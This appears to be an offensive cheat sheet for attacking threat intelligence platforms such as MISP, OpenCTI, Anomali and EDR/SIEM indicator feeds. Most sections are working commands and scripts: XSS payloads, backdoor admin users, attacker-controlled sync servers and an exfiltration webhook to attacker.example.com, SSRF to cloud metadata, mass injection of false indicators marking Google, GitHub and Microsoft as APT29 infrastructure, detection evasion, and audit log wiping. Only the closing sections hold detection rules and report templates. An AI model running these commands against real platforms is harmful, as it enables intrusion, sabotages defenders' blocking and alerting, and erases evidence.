# Threat Intel Platform Attack — Payloads & Commands

> Offensive commands for testing threat intelligence platforms. Each section covers a specific platform or attack vector. Use during scoping, recon, exploitation, and reporting phases of TI platform engagements.

## Section 1 — Recon

### 1.1 Platform identification

```bash
# MISP
curl -sI https://misp.example.com/ | head -10
curl -s https://misp.example.com/servers/checkVersion | jq .

# OpenCTI
curl -s https://opencti.example.com/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ appInformation { version } }"}'

# Anomali ThreatStream
curl -sI https://ui.threatstream.com/ | grep -i server

# ThreatQuotient
curl -sI https://ui.threatq.com/ | grep -i server

# ThreatConnect (Cisco)
curl -sI https://app.threatconnect.com/ | grep -i server
```

### 1.2 Exposed headers

```bash
curl -sI https://misp.example.com/ | grep -iE "server:|x-powered-by:|set-cookie:|content-security-policy:"

# Default MISP cookie
curl -sI https://misp.example.com/users/login | grep -i "set-cookie"
```

### 1.3 Subdomain enumeration

```bash
# Subfinder for TI platform subdomains
subfinder -d example.com -silent | grep -E "misp|opencti|threat"

# AMASS
amass enum -passive -d example.com
```

## Section 2 — MISP attacks

### 2.1 MISP version check

```bash
# Public endpoint - no auth required
curl -s https://misp.example.com/servers/checkVersion | jq .

# Response format:
# {
#   "version": "2.4.180",
#   "branch": "2.4",
#   "newest": "2.4.180"
# }
```

### 2.2 MISP API enumeration

```bash
API_KEY="REPLACE_WITH_YOUR_KEY"
HEADERS=(-H "Authorization: $API_KEY" -H "Accept: application/json")

# List events
curl -s https://misp.example.com/events/index "${HEADERS[@]}" | jq '.[0].Event.info'

# List organizations
curl -s https://misp.example.com/organisations/index "${HEADERS[@]}" | jq '.[].Organisation.name'

# List sharing groups
curl -s https://misp.example.com/sharingGroups/index "${HEADERS[@]}" | jq '.[].SharingGroup'

# List users (admin only)
curl -s https://misp.example.com/admin/users/index "${HEADERS[@]}" | jq '.[].User.email'
```

### 2.3 MISP CVE-2022-29527 (XSS in event report)

```bash
# Inject XSS payload in event report
# Payload stored in event.info field, executed when viewed
EVENT_DATA='{"Event":{"info":"<script>alert(\'XSS\')</script>","distribution":0}}'

curl -s -X POST https://misp.example.com/events/add \
  -H "Authorization: $API_KEY" \
  -H "Content-Type: application/json" \
  -d "$EVENT_DATA"
```

### 2.4 MISP API write abuse

```bash
# Inject false IOC (legitimate-looking target marked malicious)
python3 << 'EOF'
import requests

API_URL = "https://misp.example.com"
API_KEY = "REPLACE_WITH_YOUR_KEY"
HEADERS = {"Authorization": API_KEY, "Accept": "application/json"}

# Create event with false attribution
event_data = {
    "Event": {
        "info": "Suspected APT29 C2 - high confidence",
        "distribution": 0,  # All communities
        "threat_level_id": 1,  # High
        "analysis": 1,  # Ongoing
        "date": "2026-06-28"
    }
}
r = requests.post(f"{API_URL}/events/add", headers=HEADERS, json=event_data)
event_id = r.json().get("Event", {}).get("id")
print(f"Event ID: {event_id}")

# Inject false IOCs
legit_domains = ["google.com", "amazonaws.com", "github.com", "cloudfront.net"]
for d in legit_domains:
    attr_data = {
        "category": "Network activity",
        "type": "domain",
        "value": d,
        "comment": "Suspected APT29 C2 infrastructure",
        "to_ids": True,
        "distribution": 0
    }
    r = requests.post(f"{API_URL}/attributes/add/{event_id}", headers=HEADERS, json=attr_data)
    print(f"Added: {d}")
EOF
```

### 2.5 MISP sharing-group escalation

```bash
# Attempt to escalate trust (add self to higher-trust group)
curl -s -X POST https://misp.example.com/sharingGroups/addOrg/$GROUP_ID \
  -H "Authorization: $API_KEY" \
  -d "org_id=$MY_ORG&extend=1"

# Test TLP enforcement (TLP:AMBER sharing to broader audience)
curl -s -X POST https://misp.example.com/events/add \
  -H "Authorization: $LOW_TRUST_KEY" \
  -d "distribution=4&sharing_group_id=$RESTRICTED_GROUP&info=TLP:AMBER event"
```

### 2.6 MISP sync server abuse

```bash
# Sync server config contains remote API key
curl -s https://misp.example.com/servers/index \
  -H "Authorization: $ADMIN_KEY" | jq '.[].Server | {url, authkey}'

# Add attacker-controlled sync server
curl -s -X POST https://misp.example.com/servers/add \
  -H "Authorization: $ADMIN_KEY" \
  -d '{
    "url": "https://attacker-misp.example.com",
    "authkey": "ATTACKER_AUTH_KEY",
    "name": "Pwned feed",
    "remote_org_id": 1,
    "pull": true
  }'
```

### 2.7 MISP user creation (backdoor)

```bash
curl -s -X POST https://misp.example.com/admin/users/add \
  -H "Authorization: $ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "backdoor@attacker.com",
    "role_id": 4,
    "org_id": 1,
    "password": "REPLACE_WITH_STRONG_PW",
    "confirm_password": "REPLACE_WITH_STRONG_PW",
    "nids_sid": 1234567,
    "change_pw": "0"
  }'
```

### 2.8 MISP audit log wipe

```bash
curl -s -X POST https://misp.example.com/admin/logs/deleteAll \
  -H "Authorization: $ADMIN_KEY"
```

## Section 3 — OpenCTI attacks

### 3.1 OpenCTI GraphQL introspection

```bash
# Introspection query
curl -s https://opencti.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } types { name } } }"}' | jq .

# Try without auth
curl -s https://opencti.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ events { edges { node { id name } } } }"}'
```

### 3.2 OpenCTI GraphQL injection

```bash
# Test for GraphQL injection in query parameter
curl -s https://opencti.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ report(id: \"1 OR 1=1\") { name description } }"}' | jq .

# Test for IDOR (iterate IDs)
for id in $(seq 1 100); do
  curl -s https://opencti.example.com/graphql \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"query\":\"{ report(id: \\\"$id\\\") { name } }\"}" \
    | jq -r '.data.report.name' 2>/dev/null | grep -v null
done
```

### 3.3 OpenCTI SSRF in import

```bash
# Import from URL (SSRF target)
curl -s -X POST https://opencti.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { stixCoreRelationshipEdit(input: {fromId: \"indicator--abc\", toId: \"attack-pattern--xyz\"}) { id } }"
  }'

# SSRF via file upload from URL
curl -s -X POST https://opencti.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { uploadImport(file: {url: \"http://169.254.169.254/latest/meta-data/\"}) { id } }"}'
```

### 3.4 OpenCTI token abuse

```bash
# Try token without scopes
curl -s https://opencti.example.com/graphql \
  -H "Authorization: Bearer $READ_ONLY_TOKEN" \
  -d '{"query":"mutation { reportCreate(input: {name: \"test\"}) { id } }"}'

# Try admin token if compromised
curl -s https://opencti.example.com/graphql \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"query":"mutation { userAdd(input: {name: \"backdoor\", email: \"x@x.com\"}) { id } }"}'
```

### 3.5 OpenCTI feed poisoning

```bash
# Submit false STIX bundle
python3 << 'EOF'
from stix2 import Indicator, Bundle, AttackPattern, Relationship
import requests

indicator = Indicator(
    pattern="[ipv4-addr:value = '8.8.8.8']",
    pattern_type="stix",
    labels=["malicious-activity"],
    description="False positive injection - legitimate DNS marked as malicious",
    confidence=95
)

attack_pattern = AttackPattern(
    name="Phishing",
    description="False attribution"
)

relationship = Relationship(
    relationship_type="indicates",
    source_ref=indicator.id,
    target_ref=attack_pattern.id
)

bundle = Bundle(objects=[indicator, attack_pattern, relationship])

# Submit to OpenCTI
url = "https://opencti.example.com/graphql"
headers = {"Authorization": "Bearer REPLACE_WITH_YOUR_TOKEN"}
query = """
mutation($file: Upload!) {
  uploadImport(file: $file) {
    id
  }
}
"""
with open("bundle.json", "w") as f:
    f.write(bundle.serialize(pretty=True))
EOF
```

## Section 4 — STIX/TAXII feed attacks

### 4.1 STIX 2.1 bundle creation

```bash
python3 << 'EOF'
from stix2 import Indicator, Bundle, Malware, Relationship

malware = Malware(
    name="BackdoorX",
    description="False attribution",
    is_family=False,
    malware_types=["backdoor"]
)

indicator = Indicator(
    pattern="[ipv4-addr:value = '8.8.8.8']",
    pattern_type="stix",
    labels=["malicious-activity"],
    description="False positive - Google DNS",
    confidence=95,
    valid_from="2026-06-28T00:00:00Z"
)

relationship = Relationship(
    relationship_type="indicates",
    source_ref=indicator.id,
    target_ref=malware.id
)

bundle = Bundle(objects=[malware, indicator, relationship])
print(bundle.serialize(pretty=True))
EOF
```

### 4.2 TAXII 2.1 client

```bash
python3 << 'EOF'
from taxii2client.v21 import Server, Collection

server = Server("https://example.com/taxii2/", user="user", password="pass")

for api_root in server.api_roots:
    print(f"API Root: {api_root.title}")
    for collection in api_root.collections:
        print(f"  Collection: {collection.title}")
        print(f"  Description: {collection.description}")

# Read objects from collection
collection = Collection("https://example.com/taxii2/collections/123/")
objects = collection.get_objects()
print(f"Objects: {len(objects['objects'])}")
EOF
```

### 4.3 TAXII feed injection

```bash
python3 << 'EOF'
from taxii2client.v21 import Collection
from stix2 import Indicator, Bundle

collection = Collection(
    "https://example.com/taxii2/collections/123/",
    user="user",
    password="pass"
)

# Create false-positive indicator
indicator = Indicator(
    pattern="[domain-name:value = 'google.com']",
    pattern_type="stix",
    labels=["malicious-activity"],
    description="False positive",
    confidence=95
)

bundle = Bundle(objects=[indicator])

# Add to collection (requires write access)
collection.add_objects(bundle)
print("Injected false positive")
EOF
```

## Section 5 — Anomali ThreatStream attacks

### 5.1 Anomali API auth bypass

```bash
# Test for auth bypass
curl -s https://api.threatstream.com/v1/intelligence/ \
  -H "Authorization: ApiKey REPLACE_WITH_KEY" \
  | jq .success

# Try without auth
curl -s https://api.threatstream.com/v1/intelligence/
```

### 5.2 Anomali IOC injection

```bash
curl -s -X POST https://api.threatstream.com/v1/intelligence/ \
  -H "Authorization: ApiKey REPLACE_WITH_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "value": "8.8.8.8",
    "itype": "mal_ip",
    "tags": ["apt29"],
    "confidence": 95,
    "description": "Suspected APT29 infra"
  }'
```

## Section 6 — ThreatQuotient attacks

### 6.1 ThreatQuotient auth bypass

```bash
# Test for CVE-2023 auth bypass
curl -s https://ui.threatq.com/api/v1/indicators/ \
  -H "X-Auth-Token: REPLACE_WITH_TOKEN"
```

### 6.2 ThreatQuotient source injection

```bash
curl -s -X POST https://ui.threatq.com/api/v1/sources/ \
  -H "X-Auth-Token: REPLACE_WITH_TOKEN" \
  -d '{
    "name": "Pwned feed",
    "description": "Attacker-controlled",
    "type": "external"
  }'
```

## Section 7 — Palo Alto AutoFocus attacks

### 7.1 AutoFocus API testing

```bash
# Test API key
curl -s https://autofocus.paloaltonetworks.com/api/v1.0/samples/ \
  -H "apiKey: REPLACE_WITH_KEY"

# Sample search
curl -s -X POST https://autofocus.paloaltonetworks.com/api/v1.0/samples/search/ \
  -H "apiKey: REPLACE_WITH_KEY" \
  -d '{
    "scope": "global",
    "query": {"operator": "all", "children": [{"field": "sample.malware", "operator": "is", "value": 1}]}
  }'
```

### 7.2 AutoFocus XSS

```bash
# Test for stored XSS in sample metadata
curl -s -X POST https://autofocus.paloaltonetworks.com/api/v1.0/samples/upload/ \
  -H "apiKey: REPLACE_WITH_KEY" \
  -F 'file=@malware.exe;filename=<script>alert(1)</script>.exe'
```

## Section 8 — Mandiant Advantage attacks

### 8.1 Advantage GraphQL testing

```bash
# Test GraphQL endpoint
curl -s https://api.advantage.mandiant.com/graphql \
  -H "Authorization: Bearer REPLACE_WITH_KEY" \
  -d '{"query":"{ threats { id name } }"}'
```

## Section 9 — IBM Threat Intel attacks

### 9.1 X-Force API testing

```bash
curl -s https://api.xforce.ibmcloud.com/ip/8.8.8.8 \
  -H "Authorization: Basic REPLACE_WITH_BASIC_AUTH"

# Test for over-permissioned token
curl -s https://api.xforce.ibmcloud.com/cases/ \
  -H "Authorization: Basic REPLACE_WITH_KEY"
```

## Section 10 — Sharing-group trust abuse

### 10.1 Sharing group enumeration

```bash
# MISP sharing groups
curl -s https://misp.example.com/sharingGroups/index \
  -H "Authorization: $API_KEY" | jq '.[].SharingGroup'

# OpenCTI marking definitions (equivalent)
curl -s https://opencti.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ markingDefinitions { edges { node { id definition_type definition } } } }"}'
```

### 10.2 Trust escalation attempts

```bash
# Attempt to add self to higher-trust group
curl -s -X POST https://misp.example.com/sharingGroups/addOrg/$GROUP_ID \
  -H "Authorization: $API_KEY" \
  -d "org_id=$MY_ORG&extend=1"

# Attempt to create restricted sharing group with broad members
curl -s -X POST https://misp.example.com/sharingGroups/add \
  -H "Authorization: $API_KEY" \
  -d '{
    "name": "TLP:RED All Access",
    "releasability": "TLP:RED",
    "sharing_group_orgs": [{"org_id": 1, "extend": true}, {"org_id": 2, "extend": true}]
  }'
```

### 10.3 TLP enforcement testing

```bash
# Test: can TLP:AMBER event be shared broadly?
curl -s -X POST https://misp.example.com/events/add \
  -H "Authorization: $LOW_TRUST_KEY" \
  -d "distribution=3&info=TLP:AMBER content&tags[]=TLP%3AAMBER"

# Response: should fail if TLP enforced
```

## Section 11 — False-positive IOC injection

### 11.1 Bulk IOC injection

```bash
python3 << 'EOF'
import requests
import time

API_URL = "https://misp.example.com"
API_KEY = "REPLACE_WITH_YOUR_KEY"
HEADERS = {"Authorization": API_KEY, "Accept": "application/json"}

# Legitimate infrastructure to mark as malicious
false_targets = [
    "8.8.8.8", "1.1.1.1",  # DNS resolvers
    "google.com", "amazonaws.com",  # Cloud
    "github.com", "cloudfront.net",
    "microsoft.com", "office365.com",
    "cdn.cloudflare.com"
]

# Create event
event_data = {
    "Event": {
        "info": "Suspected APT29 mass infrastructure - high confidence",
        "distribution": 0,
        "threat_level_id": 1,
        "analysis": 1,
        "date": "2026-06-28"
    }
}
r = requests.post(f"{API_URL}/events/add", headers=HEADERS, json=event_data)
event_id = r.json()["Event"]["id"]
print(f"Event ID: {event_id}")

# Inject IOCs
for target in false_targets:
    attr_data = {
        "category": "Network activity",
        "type": "domain" if "." in target and not target.replace(".", "").isdigit() else "ip-dst",
        "value": target,
        "comment": "Suspected APT29 C2 infrastructure (high confidence intel)",
        "to_ids": True,  # Block this on defensive products
        "distribution": 0  # All communities - maximizes damage
    }
    r = requests.post(f"{API_URL}/attributes/add/{event_id}", headers=HEADERS, json=attr_data)
    print(f"Injected: {target}")
    time.sleep(0.1)
EOF
```

### 11.2 False-positive malware family attribution

```bash
python3 << 'EOF'
from stix2 import Malware, Indicator, Relationship, Bundle
import requests

# Mark legitimate software as malware family
malware = Malware(
    name="Windows Defender",
    description="Suspected backdoor - high confidence APT attribution",
    is_family=False,
    malware_types=["backdoor"],
    kill_chain_phases=[{
        "kill_chain_name": "lockheed-martin-cyber-kill-chain",
        "phase_name": "actions-on-objectives"
    }]
)

# Indicator pointing to legitimate Microsoft infra
indicator = Indicator(
    pattern="[domain-name:value = 'update.microsoft.com']",
    pattern_type="stix",
    labels=["malicious-activity"],
    confidence=99
)

relationship = Relationship(
    relationship_type="indicates",
    source_ref=indicator.id,
    target_ref=malware.id
)

bundle = Bundle(objects=[malware, indicator, relationship])
print(bundle.serialize(pretty=True))
EOF
```

## Section 12 — Supply-chain pivot

### 12.1 Identify downstream consumers

```bash
# MISP sync servers
curl -s https://misp.example.com/servers/index \
  -H "Authorization: $API_KEY" | jq '.[].Server | {url, name, pull, push}'

# OpenCTI ingestion feeds
curl -s https://opencti.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ feeds { edges { node { id name connector { name } } } } }"}'

# These consumers will receive false-positive IOCs
```

### 12.2 Test impact of false-positive IOCs

```bash
# If TI platform feeds firewall, false IOC = block legitimate traffic
# If feeds SIEM, false IOC = alert storm
# If feeds EDR, false IOC = false-positive quarantine
```

## Section 13 — Persistence

### 13.1 Backdoor user

```bash
curl -s -X POST https://misp.example.com/admin/users/add \
  -H "Authorization: $ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "backdoor@attacker.com",
    "role_id": 4,
    "org_id": 1,
    "password": "REPLACE_WITH_STRONG_PW",
    "confirm_password": "REPLACE_WITH_STRONG_PW",
    "nids_sid": 1234567,
    "change_pw": "0"
  }'
```

### 13.2 Sync server (persistent backdoor)

```bash
curl -s -X POST https://misp.example.com/servers/add \
  -H "Authorization: $ADMIN_KEY" \
  -d '{
    "url": "https://attacker-misp.example.com",
    "authkey": "ATTACKER_AUTH_KEY",
    "name": "Pwned feed",
    "remote_org_id": 1,
    "pull": true,
    "push": true
  }'
```

### 13.3 Webhook (data exfil)

```bash
curl -s -X POST https://misp.example.com/serverSettings/setSetting \
  -H "Authorization: $ADMIN_KEY" \
  -d '{
    "Plugin.Enrichment_services_url": "https://attacker.example.com/collect"
  }'
```

## Section 14 — Detection (red team self-monitoring)

### 14.1 Verify red team activity not detected

```bash
# Check audit log visibility
curl -s https://misp.example.com/admin/logs/index \
  -H "Authorization: $ADMIN_KEY" | jq '.[].Log | {action, title, user_id}'

# Check for alerts on suspicious writes
curl -s https://misp.example.com/logs/index \
  -H "Authorization: $API_KEY" | \
  jq '.[].Log | select(.action == "add") | {title, user_id}'
```

### 14.2 Tune payload to evade detection

```bash
# Don't bulk-inject — spread over time
python3 << 'EOF'
import requests, time, random
API_URL = "https://misp.example.com"
API_KEY = "REPLACE_WITH_YOUR_KEY"
HEADERS = {"Authorization": API_KEY}

false_targets = ["google.com", "amazonaws.com", "github.com"]
for target in false_targets:
    # Slow injection - 1 IOC per hour
    requests.post(f"{API_URL}/attributes/add/EVENT_ID",
                  headers=HEADERS,
                  json={"type": "domain", "value": target})
    time.sleep(3600)
EOF
```

## Section 15 — Cleanup + report

### 15.1 Remove backdoor

```bash
# Delete backdoor user
curl -s -X POST https://misp.example.com/users/delete/$BACKDOOR_ID \
  -H "Authorization: $ADMIN_KEY"

# Delete sync server
curl -s -X POST https://misp.example.com/servers/delete/$SYNC_ID \
  -H "Authorization: $ADMIN_KEY"

# Delete false events
curl -s -X POST https://misp.example.com/events/delete/$EVENT_ID \
  -H "Authorization: $API_KEY"
```

### 15.2 Wipe audit logs

```bash
# MISP admin can wipe logs
curl -s -X POST https://misp.example.com/admin/logs/deleteAll \
  -H "Authorization: $ADMIN_KEY"

# OpenCTI admin can delete logs
curl -s -X POST https://opencti.example.com/graphql \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"query":"mutation { logDelete(input: {date_lt: \"2026-12-31\"}) { id } }"}'
```

### 15.3 Reporting template

```markdown
# Threat Intel Platform Security Assessment Report

## Executive Summary
- Target: MISP / OpenCTI / Anomali
- Engagement dates: 2026-XX-XX to 2026-XX-XX
- Critical vulnerabilities: 3
- High vulnerabilities: 5

## Findings

### Finding 1 — CVE-2022-29527 XSS in event report
- CVSS: 6.1
- Impact: Stored XSS allows attacker to hijack admin session

### Finding 2 — API key over-permissioned
- All API keys have read+write
- Recommendation: read-only keys for most users

### Finding 3 — TLP enforcement absent
- TLP:AMBER content shared with TLP:GREEN audience
- Recommendation: policy engine enforcement

## Detection Rules Authored
- Sigma rule: bulk IOC injection
- Sigma rule: sync server creation

## Recommendations
- Patch to latest version
- Implement RBAC
- Enable TLP policy engine
- External audit log sink (immutable)
```

## Section 16 — OSINT integration abuse

### 16.1 OSINT feed manipulation

```bash
# Many TI platforms auto-ingest OSINT feeds (AlienVault OTX, Abuse.ch)
# If attacker compromises OSINT feed source, false-positive IOCs propagate

# AlienVault OTX abuse
curl -s -X POST https://otx.alienvault.com/api/v1/indicators/insert \
  -H "X-OTX-API-KEY: $OTX_KEY" \
  -d '{
    "indicator": "8.8.8.8",
    "type": "IPv4",
    "description": "Suspected APT29 C2",
    "pulse_id": $PULSE_ID
  }'

# Abuse.ch URLhaus
curl -s -X POST https://urlhaus-api.abuse.ch/v1/payload/ \
  -d 'url=https://update.microsoft.com/&tags=apt29'
```

### 16.2 RSS / Atom feed poisoning

```bash
# Some TI platforms ingest RSS feeds (CISA advisories, vendor advisories)
# Compromise RSS source → inject false-positive content
python3 << 'EOF'
import feedgenerator
feed = feedgenerator.Rss201rev2Feed(
    title="CISA Security Advisories",
    link="https://attacker.example.com/feed.xml",
    description="Compromised feed"
)
feed.add_item(
    title="Critical APT29 Campaign",
    link="https://attacker.example.com/advisory",
    description="8.8.8.8 marked as APT29 C2"
)
with open("feed.xml", "w") as f:
    feed.write(f, 'utf-8')
EOF
```

## Section 17 — Threat hunting platform abuse

### 17.1 Splunk Enterprise Security IOC injection

```bash
# Splunk ES threat intel framework
curl -s -X POST https://splunk.example.com:8089/servicesNS/admin/threat_intel/local/input/threatlist \
  -H "Authorization: Splunk $SPLUNK_TOKEN" \
  -d '{
    "name": "Attacker feed",
    "description": "False-positive injection",
    "url": "https://attacker.example.com/iocs.csv"
  }'
```

### 17.2 IBM QRadar threat intel abuse

```bash
# QRazar threat intel feed
curl -s -X POST https://qradar.example.com/api/config/event_sources/custom_properties/property_expressions \
  -H "SEC: $QRADAR_TOKEN" \
  -d '{
    "name": "Attacker feed",
    "regex": ".*",
    "payload_source": "attacker-iocs"
  }'
```

### 17.3 Microsoft Sentinel TI upload

```bash
# Sentinel Threat Intelligence Platforms data connector
az sentinel threat-intelligence-indicator create \
  --resource-group my-rg \
  --workspace-name my-workspace \
  --name "Attacker IOC" \
  --display-name "8.8.8.8" \
  --pattern "[ipv4-addr:value = '8.8.8.8']" \
  --pattern-type stix \
  --threat-types '["malicious-activity"]'
```

## Section 18 — Endpoint protection feed abuse

### 18.1 CrowdStrike Falcon IOC injection

```bash
# Falcon Custom IOC
curl -s -X POST https://api.crowdstrike.com/iocs/entities/indicators/v1 \
  -H "Authorization: Bearer $FALCON_TOKEN" \
  -d '{
    "comment": "Suspected APT29",
    "indicators": [{
      "type": "domain",
      "value": "8.8.8.8",
      "policy": "detect"
    }]
  }'
```

### 18.2 Microsoft Defender for Endpoint IOC

```bash
# Defender for Endpoint indicator API
curl -s -X POST https://api.securitycenter.microsoft.com/api/indicators \
  -H "Authorization: Bearer $DfE_TOKEN" \
  -d '{
    "indicatorValue": "google.com",
    "indicatorType": "DomainName",
    "action": "Block",
    "title": "Suspected APT29 C2",
    "severity": "High"
  }'
```

### 18.3 Palo Alto Cortex XDR IOC

```bash
curl -s -X POST https://api-xdr.cpl.paloaltonetworks.com/public_api/v1/indicators/insert_rules \
  -H "x-xdr-token: $XDR_TOKEN" \
  -d '{
    "name": "False positive IOC",
    "type": "DOMAIN",
    "value": "google.com",
    "severity": "HIGH"
  }'
```

## Section 19 — Sharing group trust model attacks

### 19.1 Sharing group enumeration (extended)

```bash
# MISP sharing group details
curl -s https://misp.example.com/sharingGroups/view/$GROUP_ID \
  -H "Authorization: $API_KEY" | jq '.SharingGroup.Org'

# OpenCTI marking definitions
curl -s https://opencti.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ markingDefinitions { edges { node { id definition_type definition } } } }"}'

# Document trust relationships + escalation paths
```

### 19.2 Trust model pivot (MISP → OpenCTI → Anomali)

```bash
# If TI platforms share data, attacker can pivot across platforms
# E.g., MISP → STIX → OpenCTI → TAXII → Anomali
# Compromise MISP → poison STIX → propagate to all downstream

python3 << 'EOF'
from stix2 import Indicator, Bundle
from taxii2client.v21 import Collection

# False-positive indicator in STIX
indicator = Indicator(
    pattern="[domain-name:value = 'github.com']",
    pattern_type="stix",
    labels=["malicious-activity"],
    confidence=95
)

bundle = Bundle(objects=[indicator])

# Push to TAXII collection (downstream platforms ingest)
collection = Collection("https://example.com/taxii2/collections/123/", user="user", password="pass")
collection.add_objects(bundle)
print("Poisoned TAXII feed")
EOF
```

## Section 20 — STIX signed bundle forgery

### 20.1 STIX signing bypass

```bash
python3 << 'EOF'
# Some TI platforms verify STIX signing but accept self-signed certs
from stix2 import Indicator, Bundle
import json

indicator = Indicator(
    pattern="[ipv4-addr:value = '8.8.8.8']",
    pattern_type="stix",
    labels=["malicious-activity"],
    confidence=95
)

bundle = Bundle(objects=[indicator])

# Add forged "signature" (if verification is weak)
bundle_dict = json.loads(bundle.serialize())
bundle_dict["x_custom_signature"] = "FORGED"
print(json.dumps(bundle_dict, indent=2))
EOF
```

## Section 21 — Cloud TI platform attacks

### 21.1 AWS Security Hub abuse

```bash
# Inject false-positive finding into Security Hub
aws securityhub batch-import-findings \
  --findings '[{
    "SchemaVersion": "2018-10-08",
    "Id": "attacker-finding-001",
    "ProductArn": "arn:aws:securityhub:us-east-1:123456789012:product/attacker/default",
    "GeneratorId": "AttackerGenerator",
    "AwsAccountId": "123456789012",
    "Types": ["TTPs"],
    "Title": "Suspected APT29 C2 - 8.8.8.8",
    "Severity": {"Label": "HIGH"},
    "Resources": [{"Type": "IpAddress", "Id": "8.8.8.8"}]
  }]'
```

### 21.2 Azure Sentinel Watchlist abuse

```bash
# Sentinel watchlists often feed detection queries
az sentinel watchlist-item create \
  --resource-group my-rg \
  --workspace-name my-workspace \
  --watchlist-alias "TI_Feed" \
  --items '[{"domain": "google.com", "comment": "APT29 C2"}]'
```

### 21.3 GCP Chronicle IOC injection

```bash
curl -s -X POST https://chronicle.googleapis.com/v1/projects/my-project/locations/us/detectors/listIoCs \
  -H "Authorization: Bearer $GCP_TOKEN" \
  -d '{
    "ioc": {
      "value": "google.com",
      "type": "DOMAIN",
      "valid_until": "2027-01-01T00:00:00Z",
      "metadata": {"malicious": true}
    }
  }'
```

## Section 22 — Defense evasion

### 22.1 Slow IOC injection (rate evasion)

```bash
python3 << 'EOF'
import requests, time, random

API_URL = "https://misp.example.com"
API_KEY = "REPLACE_WITH_YOUR_KEY"
HEADERS = {"Authorization": API_KEY}

false_targets = ["google.com", "amazonaws.com", "github.com", "cloudfront.net"]
for target in false_targets:
    requests.post(f"{API_URL}/attributes/add/EVENT_ID",
                  headers=HEADERS,
                  json={"type": "domain", "value": target})
    # Random sleep between 30-60 min
    time.sleep(random.randint(1800, 3600))
EOF
```

### 22.2 Steganographic IOC injection

```bash
# Embed IOCs in image metadata
python3 << 'EOF'
import requests
from PIL import Image
from piexif import dump, ExifIFD

img = Image.new('RGB', (100, 100), color='red')
exif = {ExifIFD.ImageDescription: "Suspected APT29: google.com,amazonaws.com,github.com"}
img.save("stego.jpg", exif=dump(exif))

# Upload as false-positive sample
files = {'file': ('stego.jpg', open('stego.jpg', 'rb'), 'image/jpeg')}
requests.post("https://misp.example.com/events/upload/EVENT_ID",
              headers={"Authorization": "REPLACE_WITH_YOUR_KEY"},
              files=files)
EOF
```

### 22.3 API rate limit evasion

```bash
# Rotate API keys (if attacker has multiple)
python3 << 'EOF'
import requests, itertools

API_URL = "https://misp.example.com"
KEYS = ["KEY1", "KEY2", "KEY3"]  # Multiple compromised keys
key_cycle = itertools.cycle(KEYS)

false_targets = [...]
for target in false_targets:
    key = next(key_cycle)
    requests.post(f"{API_URL}/attributes/add/EVENT_ID",
                  headers={"Authorization": key},
                  json={"type": "domain", "value": target})
EOF
```

## Section 23 — Audit log tampering

### 23.1 MISP log manipulation

```bash
# Modify log entry (admin only)
curl -s -X POST https://misp.example.com/admin/logs/edit/$LOG_ID \
  -H "Authorization: $ADMIN_KEY" \
  -d '{
    "action": "search",
    "title": "User viewed event",
    "user_id": 5
  }'

# Wipe specific log entries
for log_id in $(seq 1000 1100); do
  curl -s -X POST https://misp.example.com/admin/logs/delete/$log_id \
    -H "Authorization: $ADMIN_KEY"
done
```

### 23.2 OpenCTI log deletion

```bash
curl -s -X POST https://opencti.example.com/graphql \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"query":"mutation { logDelete(input: {date_lt: \"2026-12-31\"}) { id } }"}'
```

### 23.3 Anomaly detection evasion

```bash
# Spread actions across users (if attacker has multiple accounts)
python3 << 'EOF'
import requests, itertools

API_URL = "https://misp.example.com"
USERS = [("user1@attacker.com", "KEY1"), ("user2@attacker.com", "KEY2")]
user_cycle = itertools.cycle(USERS)

for target in false_targets:
    user, key = next(user_cycle)
    requests.post(f"{API_URL}/attributes/add/EVENT_ID",
                  headers={"Authorization": key},
                  json={"type": "domain", "value": target, "comment": f"Submitted by {user}"})
EOF
```

## Section 24 — Engagement reporting

### 24.1 Sigma rules for TI platform attacks

```yaml
title: Bulk IOC Injection in MISP
status: experimental
description: Detects bulk IOC injection (>20 IOCs in 1 minute)
logsource:
  product: misp
  service: api
detection:
  selection:
    action: add
    model: Attribute
  timeframe: 1m
  condition: selection | count() > 20
level: high
```

### 24.2 Sigma rule for sync server creation

```yaml
title: MISP Sync Server Registration
status: experimental
description: Detects new sync server registration (potential persistence)
logsource:
  product: misp
  service: api
detection:
  selection:
    action: add
    model: Server
  condition: selection
level: critical
```

### 24.3 SOC handoff checklist

```markdown
- [ ] All findings documented
- [ ] CVEs exploited listed
- [ ] Sigma rules authored
- [ ] Audit log monitoring tuned
- [ ] Patch timeline agreed
- [ ] Detection rules tested in production
- [ ] Final report delivered
- [ ] Follow-up engagement scheduled
```

### 24.4 Engagement report template

```markdown
# TI Platform Security Assessment Report

## Executive Summary
- Target platform: MISP / OpenCTI / etc.
- Engagement dates: 2026-XX-XX to 2026-XX-XX
- Critical findings: 3
- High findings: 5

## Findings

### Finding 1 — CVE-2022-29527 XSS
- CVSS: 6.1
- Patch available: yes (2.4.155+)
- Recommendation: upgrade immediately

### Finding 2 — API over-permission
- All API keys have write permission
- Recommendation: read-only keys for most users

### Finding 3 — TLP enforcement absent
- TLP:AMBER shared with TLP:GREEN audience
- Recommendation: policy engine enforcement

## Detection Rules Authored
- Sigma rule: bulk IOC injection
- Sigma rule: sync server creation
- Sigma rule: STIX bundle submission

## Recommendations
1. Patch to latest version
2. Implement RBAC
3. Enable TLP policy engine
4. External immutable audit log sink
5. MFA on all admin accounts
6. Geo-fence admin endpoints
7. STIX signing for all bundles
8. Sync server peer review
```
